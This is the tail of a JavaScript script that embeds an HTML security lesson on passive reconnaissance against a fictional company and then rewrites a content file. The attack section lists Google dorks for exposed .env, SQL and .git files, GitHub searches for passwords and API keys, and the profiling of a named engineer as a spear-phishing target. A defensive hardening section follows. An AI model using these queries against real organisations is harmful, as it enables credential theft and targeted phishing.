<pre><code># WHOIS for the primary domain and all related domains:
whois acme.com
whois acme.io
whois acme.net  # Do they own defensive registrations?

# RDAP (modern, JSON output):
curl https://rdap.org/domain/acme.com | python3 -m json.tool

# Historical WHOIS (who owned this domain previously?):
# DomainTools History: shows all past registrant data
# SecurityTrails: whois_history API endpoint

# Key intelligence extracted:
# - Registrar (is it a high-security registrar with MFA? or a weak one?)
# - NS records (self-hosted or third-party like AWS Route 53, Cloudflare?)
# - Registration date (how established is this organization?)
# - Expiry (domain squatting opportunity if expiring soon?)</code></pre>

<h4>Phase 2: Certificate Transparency Sweep</h4>
<pre><code># crt.sh query — all certificates issued for wildcards of target domain:
curl "https://crt.sh/?q=%.acme.com&output=json" | \
    python3 -c "import json,sys; data=json.load(sys.stdin); \
    [print(entry['name_value']) for entry in data]" | sort -u

# Output typically reveals:
acme.com
www.acme.com
mail.acme.com
vpn.acme.com            ← VPN gateway
api.acme.com            ← API server
dev.acme.com            ← Development (likely less secure)
staging.acme.com        ← Staging environment
jenkins.acme.com        ← CI/CD pipeline
kibana.acme.com         ← Log analytics (may expose sensitive data)
admin.acme.com          ← Admin interface
legacy.acme.com         ← Old system with old vulnerabilities
*.internal.acme.com     ← Wildcard: internal services with public certs?</code></pre>

<h4>Phase 3: Shodan and Censys Enumeration</h4>
<pre><code># Shodan CLI:
shodan search org:"Acme Corporation" --fields ip_str,port,hostnames,product

# Results might show:
203.0.113.25   443   mail.acme.com      Microsoft Exchange
203.0.113.30   443   vpn.acme.com       Cisco AnyConnect
203.0.113.50   443   jenkins.acme.com   Jenkins CI
203.0.113.55   5601  kibana.acme.com    Kibana (no auth!)

# Censys alternative (often indexes different ports):
# censys.io/search#type=hosts&q=parsed.names%3Aacme.com

# For each discovered IP:
shodan host 203.0.113.50   # Detailed view: all ports, all banners, all scan history
# Reveals: OS fingerprint, exact software versions, historical snapshots</code></pre>

<h4>Phase 4: Google Dorking</h4>
<pre><code># Document discovery — files that should not be public:
site:acme.com filetype:xlsx
site:acme.com filetype:csv
site:acme.com filetype:pdf "confidential"
site:acme.com filetype:sql          ← Database dumps
site:acme.com ext:bak               ← Backup files
site:acme.com ext:env               ← Laravel/PHP environment files

# Administrative interfaces:
site:acme.com inurl:admin
site:acme.com inurl:login
site:acme.com inurl:wp-admin        ← WordPress admin
site:acme.com intitle:"phpMyAdmin"

# Information leakage:
site:acme.com intitle:"index of"    ← Directory listings
site:acme.com "error in your SQL syntax"  ← SQL injection-vulnerable pages
site:acme.com "PHP Parse error"     ← Stack traces in production
site:acme.com intext:"Internal Server Error" intext:"stack"

# API and development artifacts:
site:acme.com inurl:"/api/v"        ← API endpoints
site:acme.com inurl:swagger         ← Swagger/OpenAPI documentation
site:acme.com inurl:".git"          ← Exposed .git directory (full source code!)</code></pre>

<h4>Phase 5: LinkedIn and Social Media Mapping</h4>
<pre><code># LinkedIn search: "Acme Corporation" + filter by:
# - Department: Engineering, IT, Security, Infrastructure
# - Title keywords: network, cloud, security, devops, sysadmin

# Target profile: Sarah Chen, Senior Network Engineer, Acme Corp
# Skills listed: Cisco, IOS XE, SD-WAN, Palo Alto Networks, Splunk
# Recent post: "Excited to attend Cisco Live 2024 in Las Vegas!"
# Certifications: CCNP Enterprise, CCIE track in progress

# Intelligence extracted:
# - Networking runs on Cisco IOS XE (matches Shodan data)
# - SD-WAN in use (Cisco or Verizon SD-WAN?)
# - SIEM is Splunk (useful for understanding their detection capability)
# - Sarah is a named spear phish target for a "Cisco security advisory" email

# Job posting analysis:
# "Senior Cloud Security Engineer — Requirements: AWS, Azure, GCP, Terraform,
#  GitLab CI/CD, Kubernetes (EKS/AKS), experience with Wiz or Orca preferred"
# Intelligence: multicloud deployment, GitLab for CI/CD, Wiz CSPM tool
# → Target GitLab instance (found via crt.sh: gitlab.acme.com)</code></pre>

<h4>Phase 6: GitHub and Code Repository Search</h4>
<pre><code># Search GitHub for organization's public repos:
# github.com/AcmeCorp — browse all public repositories

# Search across all repos (requires being logged in):
"acme.com" "password"
"acme.com" "api_key"
"acme.com" "secret"
org:AcmeCorp "internal"
org:AcmeCorp filename:.env
org:AcmeCorp "mongodb://prod"

# truffleHog — automated secret scanning (run against public repos):
trufflehog github --org AcmeCorp --only-verified

# gitleaks — scan all commits in a repo's history:
gitleaks detect --source /path/to/cloned/repo --report-format json</code></pre>

<h4>Phases 7-8: Job Posting Analysis and Threat Intel Feeds</h4>
<pre><code># Phase 7: Job posting technology enumeration
# Archive job postings (they disappear when filled):
# web.archive.org/web/*/acme.com/careers
# LinkedIn Jobs history via Google: site:linkedin.com/jobs "Acme Corporation"

# Phase 8: Threat intelligence feeds
# VirusTotal — has anyone submitted acme.com files or URLs?
# URLhaus — is any acme.com URL in abuse feeds? (indicates prior compromise)
# HaveIBeenPwned API — which employee emails appear in breach databases?
curl "https://haveibeenpwned.com/api/v3/breachedaccount/sarah.chen@acme.com" \
    -H "hibp-api-key: YOUR_API_KEY"
# Returns: which breach databases contain this email (with associated passwords)</code></pre>
\`,
    defense: \`
<h2>Defending Against Passive Reconnaissance</h2>
<p>
  You cannot prevent someone from reading public information. But you can dramatically
  reduce the intelligence value of what they find, monitor what an attacker would see
  about you, and build detection for when passive recon transitions to active probing.
</p>

<h3>Running Reconnaissance Against Yourself — Attack Surface Management</h3>
<p>
  The most important passive recon defense is doing it to yourself continuously.
  Organizations that run regular external attack surface assessments consistently find
  forgotten infrastructure, unauthorized certificates, and exposed services that internal
  teams did not know existed.
</p>
<pre><code># Regular Shodan assessment of your own IP ranges:
shodan search net:203.0.113.0/24 --fields ip_str,port,product,version

# Subscribe to Shodan Monitor (free tier available):
# Alerts you within hours when a new port or service appears on your IP ranges
# Critical: you should know about new internet-facing services before attackers do

# crt.sh monitoring — detect unauthorized certificates:
# Monitor for certificates you did not issue:
https://crt.sh/?q=%.acme.com  (review weekly)

# Tools for continuous ASM:
# - SecurityTrails: DNS history, subdomain monitoring
# - RiskIQ (Microsoft Defender EASM): enterprise attack surface management
# - Censys Attack Surface Management: continuous internet-wide scanning of your assets

# What to do when you find unexpected exposure:
# 1. Verify it is actually your infrastructure (sometimes Shodan is stale)
# 2. Determine if the service should be internet-facing
# 3. If not: restrict via firewall immediately
# 4. If yes: verify it is patched, correctly configured, with MFA</code></pre>

<h3>WHOIS Privacy and Domain Security</h3>
<pre><code># Enable WHOIS privacy with your registrar:
# - Hides personal names, email addresses, phone numbers
# - Does NOT hide: nameservers, registrar, dates, domain status

# What an attacker can still learn from redacted WHOIS:
# → Nameservers reveal your DNS provider (AWS Route 53? Cloudflare? Self-hosted?)
# → Registrar reveals your registrar's security posture
# → Domain age reveals organizational maturity
# → Expiry date reveals if squatting is an option

# Domain security hardening:
# - Enable registry lock (premium feature — prevents unauthorized transfers)
# - Enable two-factor authentication on your registrar account
# - Use a business email address (not personal) for registrar account
# - Set expiry alerts: auto-renew AND calendar reminders at 90, 30, 7 days

# Defensive domain registration:
# Register common misspellings of your domain (acme.corn, acne.com, amc.com)
# Register your domain in country-code TLDs (.co.uk, .de, etc.) if operating there
# Monitor for typosquatted domains: dnstwist tool
pip install dnstwist
dnstwist --registered acme.com   # Find registered variations of your domain</code></pre>

<h3>GitHub Secret Scanning and Repository Hygiene</h3>
<pre><code># Enable GitHub Secret Scanning (free for public repos, part of Advanced Security):
# Settings → Security → Code security and analysis → Secret scanning → Enable

# GitHub will alert you when secrets matching common patterns are pushed:
# - AWS access keys (AKIA...)
# - GitHub personal access tokens
# - Slack tokens
# - Stripe API keys
# - Private keys (BEGIN RSA PRIVATE KEY)
# - And 200+ other patterns

# Pre-commit hooks to prevent secrets from ever reaching the repo:
# Install detect-secrets:
pip install detect-secrets
detect-secrets scan > .secrets.baseline

# .pre-commit-config.yaml:
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

# Install pre-commit:
pip install pre-commit
pre-commit install   # Now runs on every git commit

# gitleaks as an alternative (or complement):
gitleaks protect --staged   # Scan staged files before commit

# If a secret has been committed — even once, even if deleted:
# 1. Treat the credential as fully compromised
# 2. Rotate it IMMEDIATELY (revoke old, generate new)
# 3. GitHub's search index caches deleted content for months
# 4. Specialized services (GitGuardian) have already indexed it
# 5. Do not rely on "I deleted the commit" — it is not enough</code></pre>

<h3>Reducing Information Leakage in Job Postings</h3>
<p>
  Every technical detail in a public job posting is passive intelligence for an attacker.
  This does not mean job postings should be vague — it means being deliberate about
  what specificity is necessary for recruiting vs what specificity enables targeting.
</p>
<ul>
  <li><strong>Never specify version numbers</strong>: "Experience with Cisco IOS XE 17.3"
  tells attackers exactly which CVEs apply. Say "Cisco enterprise networking" instead.</li>
  <li><strong>Avoid listing specific security tools</strong>: "Experience with Splunk ES"
  tells attackers your SIEM. "Experience with SIEM platforms" does not.</li>
  <li><strong>Do not reveal exact cloud footprint</strong>: "AWS EKS, Azure AKS, and GCP GKE"
  tells attackers you have a multicloud strategy. "Cloud container orchestration" is sufficient.</li>
  <li><strong>Review historical job postings</strong>: Use the Wayback Machine to find old postings
  that may have revealed sensitive details and assess whether that information is still valid.</li>
</ul>

<h3>Error Page Hardening and HTTP Header Hygiene</h3>
<pre><code># Replace default error pages (which reveal server type, version, OS):
# nginx — custom error pages:
error_page 400 401 403 404 /errors/4xx.html;
error_page 500 502 503 504 /errors/5xx.html;

# The 4xx.html and 5xx.html should contain ZERO technical information:
# Good: "Something went wrong. Please try again or contact support."
# Bad: "Apache/2.4.49 (Ubuntu) Server at acme.com Port 443"
# Bad: "MySQL Error: Table 'prod_db.users' doesn't exist"
# Bad: Full Python traceback with file paths and variable contents

# Remove version-revealing HTTP headers:
server_tokens off;           # nginx: hides version from Server header
add_header Server "acme";    # Replace with custom value or remove entirely

# PHP:
# php.ini: expose_php = Off
# Removes X-Powered-By: PHP/x.x.x header

# Check what you are leaking right now:
curl -I https://acme.com
# Review every header for version numbers and technology disclosure</code></pre>

<h3>Dark Web and Breach Monitoring</h3>
<pre><code># HaveIBeenPwned API — check if employee emails appear in breach databases:
# https://haveibeenpwned.com/API/v3
# Integrate into onboarding: check all new employee emails
# Set up domain-level monitoring: alerts when ANY @acme.com address appears in new breach

# Commercial services:
# - SpyCloud: breach data with plaintext passwords, used for credential stuffing defense
# - Digital Shadows (ReliaQuest): full dark web monitoring including paste sites
# - Recorded Future: threat intelligence with dark web coverage

# Paste site monitoring:
# Attackers often post credential dumps, source code, and internal data to Pastebin
# Monitor for your domain name, IP ranges, employee names
# SIEM integration: ingest Pastebin/GitHub Gist new public posts, search for org keywords

# Manual paste site monitoring (start here before buying commercial tools):
# Google alerts: "acme.com" site:pastebin.com
# Set up Google Alerts for: your domain, executive names, product names, internal codenames</code></pre>

<h3>Monitoring Your Own Passive Recon Profile — Continuous Program</h3>
<p>
  Passive reconnaissance defense is not a one-time audit — it is a continuous program.
  At minimum, implement the following on a recurring schedule:
</p>
<ul>
  <li><strong>Weekly</strong>: Review crt.sh for new certificate issuances on your domain.
  Any cert you did not authorize indicates a misconfigured system, a shadow IT deployment,
  or a hostile certificate issuance.</li>
  <li><strong>Weekly</strong>: Run Shodan against your IP ranges. New entries mean new
  internet-facing services — intended or not.</li>
  <li><strong>Monthly</strong>: Full theHarvester run against your domain. Review what
  an attacker would find in one hour of passive recon today.</li>
  <li><strong>Monthly</strong>: Review public GitHub repositories associated with your
  organization. New repos by employees may contain sensitive data.</li>
  <li><strong>Quarterly</strong>: Review job postings for technology disclosure. Brief
  HR and technical recruiting on what not to publish.</li>
  <li><strong>On every breach notification</strong>: Run HaveIBeenPwned against all
  employee emails. Reset passwords for affected accounts. Assume the password was reused.</li>
</ul>
\`,
  },`;

// Now perform the replacements
// We need to replace from 0-indexed dnsStart through dnsEnd
const beforeDns = lines.slice(0, dnsStart).join('\n');
const afterDns = lines.slice(dnsEnd + 1).join('\n');

const httpStartInNew = afterDns.split('\n').findIndex(l => l.trim() === "'http-https': {");
const httpEndInNew = findBlockEnd(afterDns.split('\n'), httpStartInNew);

const beforeHttp = afterDns.split('\n').slice(0, httpStartInNew).join('\n');
const afterHttp = afterDns.split('\n').slice(httpEndInNew + 1).join('\n');

const reconStartInNew = afterHttp.split('\n').findIndex(l => l.trim() === "'passive-recon': {");
const reconEndInNew = findBlockEnd(afterHttp.split('\n'), reconStartInNew);

const beforeRecon = afterHttp.split('\n').slice(0, reconStartInNew).join('\n');
const afterRecon = afterHttp.split('\n').slice(reconEndInNew + 1).join('\n');

const newContent = [
  beforeDns,
  dnsReplacement,
  beforeHttp,
  httpReplacement,
  beforeRecon,
  reconReplacement,
  afterRecon
].join('\n');

writeFileSync(filePath, newContent, 'utf8');
console.log('Done. File written successfully.');
console.log('New line count:', newContent.split('\n').length);
